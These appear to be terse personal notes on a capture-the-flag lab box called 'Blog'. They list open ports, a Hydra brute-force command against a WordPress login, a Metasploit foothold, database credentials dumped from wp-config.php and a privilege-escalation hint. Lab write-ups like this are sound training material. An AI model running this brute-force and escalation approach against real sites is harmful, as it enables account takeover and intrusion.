Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

Credit to Sq00ky for the root privesc idea ;)


Discovered open port 80/tcp on 10.10.173.110
Discovered open port 445/tcp on 10.10.173.110
Discovered open port 139/tcp on 10.10.173.110
Discovered open port 22/tcp on 10.10.173.110
kwheel is moms login, we just need author access for box
hydra -l kwheel -P ./passwordlist.txt http://thm.blog -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=ERROR: The password you entered for the username kwheel is incorrect.'


metasploit foothold

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r----- 1 www-data www-data 3279 May 28  2020 /var/www/wordpress/wp-config.php                                  
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');

set admin variable then use checker for priesc